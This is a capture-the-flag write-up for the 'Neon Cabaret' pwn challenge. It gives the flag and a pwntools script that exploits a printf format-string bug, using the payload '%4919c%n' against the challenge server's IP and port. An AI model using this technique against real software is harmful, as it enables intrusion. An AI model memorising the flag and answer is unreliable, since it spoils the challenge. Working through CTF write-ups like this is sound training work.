---
title: "Neon Cabaret"
ctf: "Safaricom CTF"
date: 2026-10-04
category: pwn
difficulty: medium
points: 300
flag_format: "safctf{...}"
author: "nomadspecter <the.nomad.specter@gmail.com>"
---

# Neon Cabaret

## Summary

- **Flag:** `safctf{c6d2ec6a705f9a51db0be634224d3358}`

## Solution

### Step 1: Run the solve script:

```python
#!/usr/bin/env python3
"""
Neon Cabaret (pwn) - Safaricom CTF
==================================
Remote: nc 54.72.82.22 8740   ("Neon Cabaret. Guest line:")
Binary: http://54.72.82.22:8610/downloads/receipt  (raw ELF, no ext)
        sha256 360bbeffbc19859124f76ee0ebdc2136f81cbe4305518db4ef49ef53573446a3

Bug
---
main() does:

    printf(user_buf, 0x40405c);        # <- user-controlled format string
    if (*(u32*)0x40405c == 0x1337)     # win condition (global dword)
        win();                         # fopen("/run/receipt","r"); fgets; puts  -> FLAG

rsi and rdx both hold 0x40405c at the printf() call, so the first two
varargs of printf point straight at the win-condition dword.

Technique
---------
Single-shot format string write:  "%4919c%n"
  * %4919c  consumes arg1 (rsi = 0x40405c) and prints 4919 chars.
  * %n      consumes arg2 (rdx = 0x40405c) and writes 4919 = 0x1337 to it.
Check passes -> win() reads /run/receipt and prints the flag.

No PIE, no canary, partial RELRO, NX enabled -> classic GOT/global overwrite.
"""
from pwn import context, remote

HOST, PORT = "54.72.82.22", 8740
WIN_OFF = 0x40405C          # global dword checked against 0x1337
WANT = 0x1337               # 4919


def main():
    context.log_level = "info"
    payload = b"%4919c%n"   # 4919 == 0x1337 == WANT

    r = remote(HOST, PORT)
    r.recvuntil(b"Guest line:\n", timeout=5)
    r.sendline(payload)
    data = r.recvall(timeout=10)
    r.close()

    import re
    m = re.search(rb"safctf\{[0-9a-fA-F]{32}\}", data)
    if m:
        print(m.group(0).decode())
    else:
        print("no flag found, raw tail:", data[-400:])


if __name__ == "__main__":
    main()

```

## Flag

```
safctf{c6d2ec6a705f9a51db0be634224d3358}
```
